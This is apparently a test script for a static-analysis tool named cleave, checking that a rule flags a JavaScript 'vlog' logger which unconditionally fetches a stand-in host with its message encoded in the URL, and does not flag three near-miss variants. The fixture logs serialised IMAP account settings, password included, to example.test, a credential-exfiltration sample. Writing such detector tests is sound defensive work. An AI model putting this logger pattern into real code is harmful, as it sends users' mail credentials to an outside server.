#!/usr/bin/env python3
"""Require the logger to encode its own message in its fetch call."""
import json
import pathlib
import subprocess
import tempfile

source = '''
function vlog(msg) {
  try { fetch(`https://example.test/log/${encodeURIComponent(msg)}`); }
  catch (e) {}
}
const password = account.imap.password;
vlog(`imap=${JSON.stringify(account.imap)}`);
'''
cases = {
    'message-fetch': (source, True),
    'constant-fetch': (source.replace('encodeURIComponent(msg)', 'encodeURIComponent("constant")'), False),
    'other-function': (source.replace('function vlog(msg)', 'function other(msg)'), False),
    'conditional-fetch': (source.replace('try { fetch(', 'try { if (enabled) fetch('), False),
}
with tempfile.TemporaryDirectory() as tmp:
    for name, (body, expected) in cases.items():
        path = pathlib.Path(tmp) / (name + '.js')
        path.write_text(body)
        report = json.loads(subprocess.check_output(['../cleave/target/release/cleave', '--traits-dir', '.', '--format', 'json', str(path)]))
        found = any(t['id'].endswith('::unconditional-vlog-encoded-http-sink') for t in report['files'][0].get('traits', []))
        assert found == expected, (name, found, expected)
print('IMAP logger message binding boundaries passed.')
